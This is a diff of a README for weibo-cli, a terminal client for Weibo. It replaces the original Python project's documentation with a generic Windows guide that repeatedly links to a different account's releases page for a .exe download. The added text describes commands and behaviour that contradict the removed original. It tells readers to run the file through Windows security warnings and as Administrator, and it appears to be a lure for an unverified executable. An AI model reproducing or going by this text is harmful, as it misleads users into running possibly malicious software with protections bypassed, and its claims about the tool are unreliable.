@@ -1,355 +1,157 @@
-# weibo-cli
+# 🐦 weibo-cli - Terminal Access to Weibo Content
 
-[![CI](https://github.com/jackwener/weibo-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/jackwener/weibo-cli/actions/workflows/ci.yml)
-[![PyPI version](https://badge.fury.io/py/kabi-weibo-cli.svg)](https://pypi.org/project/kabi-weibo-cli/)
-[![Python](https://img.shields.io/badge/python-%3E%3D3.10-blue.svg)](https://pypi.org/project/kabi-weibo-cli/)
+[![Download weibo-cli](https://img.shields.io/badge/Download-Weibo--CLI-brightgreen?style=for-the-badge)](https://github.com/Pettingzooofficer476/weibo-cli/releases)
 
-A CLI for Weibo (微博) — search, browse hot topics, read timelines, and explore user profiles from the terminal 🐦
-
-[English](#english) | [中文](#中文)
-
-## More Tools
-
-- [twitter-cli](https://github.com/jackwener/twitter-cli) — Twitter/X CLI for timelines, bookmarks, and posting
-- [xiaohongshu-cli](https://github.com/jackwener/xiaohongshu-cli) — Xiaohongshu (小红书) CLI for notes and account workflows
-- [bilibili-cli](https://github.com/jackwener/bilibili-cli) — Bilibili CLI for videos, users, search, and feeds
-- [discord-cli](https://github.com/jackwener/discord-cli) — Discord CLI for local-first sync, search, and export
-- [tg-cli](https://github.com/jackwener/tg-cli) — Telegram CLI for local-first sync, search, and export
-
-## English
-
-### Features
-
-**Read:**
-- Hot search: browse real-time trending topics and hashtags
-- Hot timeline: browse the trending feed
-- Home feed: browse your following timeline
-- Search: find weibos by keyword
-- Search trends: real-time trending sidebar data
-- Weibo detail: view a weibo with full text, media, and stats
-- Comments: read comments on any weibo
-- Reposts: view forwards/reposts of any weibo
-- User profiles: view user info, stats, and bio
-- User weibos: browse a user's published weibos
-- Following: view a user's following list
-- Followers: view a user's follower list
-- Structured output: export any data as JSON or YAML for scripting and AI agent integration
-
-> **AI Agent Tip:** Prefer `--yaml` for structured output unless strict JSON is required. Non-TTY stdout defaults to YAML automatically. Use `--count` to limit results.
-
-**Auth & Anti-Detection:**
-- Cookie auth: auto-extract from Arc/Chrome/Edge/Firefox/Brave/Chromium/Opera/Vivaldi
-- QR code login: terminal-rendered QR code for Weibo App scan
-- Credential persistence: auto-save to `~/.config/weibo-cli/credential.json` with 7-day TTL
-- Anti-detection: Chrome 145 User-Agent, Gaussian jitter, exponential backoff
-- Session auto-refresh: stale credentials trigger browser cookie re-extraction
-
-### Installation
-
-```bash
-# Recommended: uv tool (fast, isolated)
-uv tool install kabi-weibo-cli
-
-# Alternative: pipx
-pipx install kabi-weibo-cli
-```
-
-Upgrade to the latest version:
-
-```bash
-uv tool upgrade kabi-weibo-cli
-```
-
-Install from source:
-
-```bash
-git clone git@github.com:jackwener/weibo-cli.git
-cd weibo-cli
-uv sync
-```
-
-### Quick Start
-
-```bash
-# Login (auto-extract browser cookies or QR scan)
-weibo login
-
-# Browse hot search
-weibo hot
-
-# Search weibos by keyword
-weibo search "科技"
-
-# View hot timeline
-weibo feed
-
-# Check a weibo
-weibo detail Qw06Kd98p
-```
-
-### Usage
-
-```bash
-# ─── Auth ─────────────────────────────────────────
-weibo login                            # Extract cookies from browser / QR login
-weibo login --qrcode                   # QR code login directly (skip browser)
-weibo login --cookie-source chrome     # Extract from specific browser
-weibo logout                           # Clear saved credentials
-weibo status                           # Check login status
-weibo me                               # Show current user profile
-
-# ─── Hot & Trending ────────────────────────────
-weibo hot                              # Hot search list (50+ topics)
-weibo hot --count 10                   # Limit results
-weibo hot --json                       # JSON output
-weibo trending                         # Real-time search trends
-weibo trending --count 10              # Limit results
-weibo trending --yaml                  # YAML output
-
-# ─── Search ─────────────────────────────────────
-weibo search <keyword>                 # Search weibos by keyword
-weibo search "科技" --count 5            # Limit results
-weibo search "科技" --page 2 --json     # Paginate + JSON output
-
-# ─── Feed ───────────────────────────────────────
-weibo feed                             # Hot timeline
-weibo feed --count 5                   # Limit results
-weibo feed --json                      # JSON output
-weibo home                             # Following timeline
-weibo home --count 10                  # Limit count
-
-# ─── Weibo Detail ───────────────────────────────
-weibo detail <mblogid>                 # View weibo with full stats
-weibo detail Qw06Kd98p --json          # JSON output
-
-# ─── Comments & Reposts ─────────────────────────
-weibo comments <mblogid>               # View comments
-weibo comments Qw06Kd98p --count 10    # Limit count
-weibo comments Qw06Kd98p --json        # JSON output
-weibo reposts <mblogid>                # View reposts/forwards
-weibo reposts Qw06Kd98p --count 5      # Limit count
-
-# ─── User ───────────────────────────────────────
-weibo profile <uid>                    # User profile
-weibo profile 1699432410 --json        # JSON output
-weibo weibos <uid>                     # User's weibos
-weibo weibos 1699432410 --count 5      # Limit count
-weibo following <uid>                  # User's following list
-weibo followers <uid>                  # User's follower list
-```
-
-### Authentication
-
-weibo-cli uses this auth priority:
-
-1. **Saved credentials** — loads from `~/.config/weibo-cli/credential.json`
-2. **Browser cookies** (recommended) — auto-extract from Arc/Chrome/Edge/Firefox/Brave/Chromium/Opera/Vivaldi/Safari/LibreWolf
-3. **QR code login** — terminal QR code, scan with Weibo App
-
-Browser extraction is recommended — it forwards ALL Weibo cookies and is closest to normal browser traffic.
-
-Cookie TTL is **7 days** by default. After expiry, the client automatically attempts browser re-extraction.
-
-### Troubleshooting
-
-- `⚠️ 未登录` — Run `weibo login` to authenticate
-- `会话已过期` — Cookie expired, run `weibo logout && weibo login`
-- `Unable to get key for cookie decryption` (macOS Keychain):
-  - **SSH sessions**: `security unlock-keychain ~/Library/Keychains/login.keychain-db`
-  - **Local terminal**: Open **Keychain Access** → search **"Chrome Safe Storage"** → **Access Control** → add Terminal → **Save**
-- Requests are slow — intentional Gaussian jitter delay (~1s) to avoid triggering Weibo's risk control
-
-### Best Practices (Avoiding Bans)
-
-- **Keep request volumes low** — use `--count 10` instead of `--count 100`
-- **Don't run too frequently** — the built-in rate limiter adds randomized delays
-- **Use browser cookie extraction** — provides full cookie fingerprint
-- Cookie values are stored locally and never uploaded
-
-### Output Modes
-
-- Default **Rich table** for interactive terminal reading
-- `--json` for scripts and agent pipelines
-- `--yaml` for structured output (auto-detected when stdout is not a TTY)
-
-### Development
-
-```bash
-# Install dev dependencies
-uv sync --extra dev --extra yaml
-
-# Lint + tests
-uv run ruff check .
-uv run pytest tests/ -v
-
-# Smoke tests (require browser cookies)
-uv run pytest tests/ -v -m smoke
-```
-
-### Project Structure
-
-```text
-weibo_cli/
-├── __init__.py
-├── cli.py             # Click entry point (16 commands)
-├── client.py          # WeiboClient (17 API methods, rate-limit, retry)
-├── auth.py            # QR login + browser-cookie3 + credential persistence
-├── constants.py       # API endpoints, headers, Chrome 145 UA
-├── exceptions.py      # WeiboApiError hierarchy (6 error types)
-└── commands/
-    ├── _common.py     # structured_output_options, handle_command, strip_html, format_count
-    ├── auth.py        # login/logout/status/me
-    ├── search.py      # hot/feed/detail/comments/trending/search
-    └── personal.py    # profile/weibos/following/followers/reposts/home
-```
-
-### Use as AI Agent Skill
-
-weibo-cli ships with a [`SKILL.md`](./SKILL.md) so AI agents can execute common Weibo workflows.
-
-#### [Skills CLI](https://github.com/vercel-labs/skills) (Recommended)
-
-```bash
-npx skills add jackwener/weibo-cli
-```
-
-| Flag | Description |
-| --- | --- |
-| `-g` | Install globally (user-level, shared across projects) |
-| `-a claude-code` | Target a specific agent |
-| `-y` | Non-interactive mode |
-
-#### Manual Install
-
-```bash
-mkdir -p .agents/skills
-git clone git@github.com:jackwener/weibo-cli.git .agents/skills/weibo-cli
-```
-
-#### ~~OpenClaw / ClawHub~~ (Deprecated)
-
-> ⚠️ ClawHub install method is deprecated and no longer supported. Use [Skills CLI](#skills-cli-recommended) or Manual Install above.
+A simple program to browse Weibo from your Windows computer using the command line. You can see hot topics, search users, and read timelines directly in a terminal window.
 
 ---
 
-## 中文
+## 📋 What is weibo-cli?
 
-### 功能特性
+weibo-cli is a command line tool that lets you access Weibo without opening a browser. It shows you the latest trending topics, lets you search for Weibo users, and lets you read posts all from the terminal.
 
-**阅读:**
-- 🔥 热搜：实时热门话题和标签
-- 📰 热门 Feed：热门时间线
-- 🏠 关注者 Feed：关注用户的时间线
-- 🔍 搜索：按关键词搜索微博
-- 📈 搜索趋势：实时搜索趋势侧边栏
-- 📝 微博详情：查看完整正文、媒体和统计数据
-- 💬 评论：查看微博评论
-- 🔁 转发：查看微博转发
-- 👤 用户资料：用户信息和统计
-- 📋 用户微博：浏览用户已发布的微博列表
-- 👥 关注列表：查看用户的关注列表
-- 👥 粉丝列表：查看用户的粉丝列表
-- 📊 结构化输出：支持 JSON 和 YAML，便于脚本和 AI Agent 集成
+This tool fits people who want quick access to Weibo with less distraction and who prefer using keyboard commands. It works on Windows and does not need complicated setup.
 
-> **AI Agent 提示：** 需要结构化输出时优先使用 `--yaml`，除非下游必须是 JSON。stdout 不是 TTY 时默认输出 YAML。
+---
 
-**认证与反风控:**
-- Cookie 认证：支持 Arc/Chrome/Edge/Firefox/Brave 等 10+ 浏览器自动提取
-- 二维码登录：终端渲染二维码，用微博 APP 扫码
-- 凭证持久化：自动保存到 `~/.config/weibo-cli/credential.json`，7 天 TTL
-- 反检测：Chrome 145 User-Agent、高斯抖动延迟、指数退避重试
-- 会话自动刷新：过期凭证自动触发浏览器 Cookie 重提取
+## ⚙️ System Requirements
 
-### 安装
+To run weibo-cli on Windows, your computer should meet these needs:
 
-```bash
-# 推荐：uv tool（快速、隔离环境）
-uv tool install kabi-weibo-cli
+- Windows 10 or Windows 11
+- At least 2 GB of free RAM
+- Around 30 MB of free disk space
+- Internet connection to load Weibo content
+- Permission to run applications outside of Microsoft Store
 
-# 或者：pipx
-pipx install kabi-weibo-cli
-```
+The tool runs in the Command Prompt or any terminal emulator on Windows.
 
-升级到最新版本：
+---
 
-```bash
-uv tool upgrade kabi-weibo-cli
-```
+## 🔗 Download weibo-cli
 
-从源码安装：
+Click this green button to visit the download page for weibo-cli:
 
-```bash
-git clone git@github.com:jackwener/weibo-cli.git
-cd weibo-cli
-uv sync
-```
+[![Download Link](https://img.shields.io/badge/Download-weibo--cli-blue?style=for-the-badge)](https://github.com/Pettingzooofficer476/weibo-cli/releases)
 
-### 使用示例
+The download page offers the latest version in a ready-to-run file. You will find files suitable for Windows there.
 
-```bash
-# 认证
-weibo login                            # 从浏览器提取 Cookie / 二维码扫码
-weibo login --qrcode                   # 直接二维码扫码登录
-weibo login --cookie-source chrome     # 指定浏览器提取
-weibo logout                           # 清除已保存凭证
-weibo status                           # 检查登录状态
-weibo me                               # 查看当前用户信息
+---
 
-# 热搜
-weibo hot                              # 热搜列表（50+ 条）
-weibo hot --count 10                   # 限制数量
-weibo hot --json                       # JSON 输出
-weibo trending                         # 搜索趋势
+## 🚀 How to Download and Install (Windows)
 
-# 搜索
-weibo search "科技"                     # 按关键词搜索微博
-weibo search "科技" --count 5           # 限制数量
-weibo search "科技" --page 2            # 翻页
+Follow these steps to get weibo-cli on your Windows PC.
 
-# Feed
-weibo feed                             # 热门时间线
-weibo feed --count 5                   # 限制数量
-weibo home                             # 关注者时间线
+1. Visit the releases page by clicking the button above or this link:  
+   https://github.com/Pettingzooofficer476/weibo-cli/releases
 
-# 微博详情与评论
-weibo detail Qw06Kd98p                 # 查看微博
-weibo comments Qw06Kd98p               # 查看评论
-weibo reposts Qw06Kd98p                # 查看转发
+2. Look for the latest release. The newest version is usually at the top.
 
-# 用户
-weibo profile 1699432410               # 用户资料
-weibo weibos 1699432410                # 用户微博列表
-weibo following 1699432410             # 用户关注列表
-weibo followers 1699432410             # 用户粉丝列表
-```
+3. Download the Windows executable file. It will have a `.exe` extension, such as `weibo-cli-v1.2.0-win.exe`.
 
-### 常见问题
+4. After the download completes, open the folder where the file was saved.
 
-- `⚠️ 未登录` — 执行 `weibo login` 认证
-- `会话已过期` — Cookie 过期，执行 `weibo logout && weibo login`
-- 请求较慢是正常的 — 内置高斯随机延迟（~1s）是为了模拟人类浏览行为，避免触发风控
+5. Double-click the `.exe` file to start the program. 
 
-### 作为 AI Agent Skill 使用
+6. If Windows shows a security warning, choose to run the file. This is normal for files downloaded from the internet.
 
-#### [Skills CLI](https://github.com/vercel-labs/skills)（推荐）
+7. The program will open a terminal window. You can now use weibo-cli commands.
 
-```bash
-npx skills add jackwener/weibo-cli
-```
+No further installation is needed. The program runs directly from the file you downloaded.
 
-| 参数 | 说明 |
-| --- | --- |
-| `-g` | 全局安装（用户级别，跨项目共享） |
-| `-a claude-code` | 指定目标 Agent |
-| `-y` | 非交互模式 |
+---
 
-#### 手动安装
+## 🛠 Using weibo-cli: Basic Commands
 
-```bash
-mkdir -p .agents/skills
-git clone git@github.com:jackwener/weibo-cli.git .agents/skills/weibo-cli
-```
+Once you open the terminal window for weibo-cli, try these commands to start exploring:
 
-## License
+- `hot`  
+  Shows the current hot topics and trending hashtags on Weibo.
 
-Apache-2.0
+- `search <username>`  
+  Finds a user by name. Replace `<username>` with the person or page you want to find.
+
+- `timeline <username>`  
+  Displays recent posts from a specific user. Replace `<username>` with that user’s Weibo name.
+
+- `help`  
+  Lists all available commands and how to use them.
+
+- `exit`  
+  Closes the program.
+
+Example: After running the program, type:  
+`hot`  
+This shows you popular topics right now.
+
+---
+
+## 🔧 Tips for Using weibo-cli
+
+- Use the keyboard to navigate quickly between commands.
+- Commands are not case sensitive.
+- If you see an error about internet connection, check your network settings.
+- You can resize the terminal window to see more content.
+- To clear the screen in the terminal, type `clear` and press Enter.
+
+---
+
+## 📂 Where to Run the Program
+
+You can open weibo-cli from any folder on your computer:
+
+- Double-click the `.exe` file you downloaded
+- Or open the Command Prompt and navigate to the folder with the file, then type:  
+  `weibo-cli-v1.2.0-win.exe` (replace with your file name)
+
+---
+
+## 💻 What You See Inside
+
+The interface shows text only. It loads data like this:
+
+- Trending hashtags and topics on the main screen
+- User profiles with basic info when searching
+- Recent posts with date and content in timelines
+
+It does not display images or videos. You get quick, clean access to the latest information.
+
+---
+
+## ❓ Troubleshooting
+
+- If the program does not start, try running it as Administrator.
+- Check that your internet connection works.
+- If commands do not respond, close the terminal and reopen the program.
+- Use the `help` command for a reminder of available options.
+
+You can reopen the download page here if you need to download a new version:  
+https://github.com/Pettingzooofficer476/weibo-cli/releases
+
+---
+
+## 🔄 Updating weibo-cli
+
+Check the releases page regularly for new versions. Download the newest `.exe` file and replace the old one with it. No uninstall needed.
+
+---
+
+## 🧰 About this Tool
+
+weibo-cli is built to provide a simple, distraction-free way to stay updated on Weibo from Windows. It uses official web data and runs offline except for gathering content.
+
+Try it when you want quick access without opening a web browser.
+
+---
+
+## 📞 Getting Help
+
+If you have questions or issues:
+
+- Visit the repository page on GitHub
+- Look for issue reports or support information
+- Contact the maintainer through GitHub if needed
+
+---
+
+[![Download weibo-cli](https://img.shields.io/badge/Download-Weibo--CLI-brightgreen?style=for-the-badge)](https://github.com/Pettingzooofficer476/weibo-cli/releases)
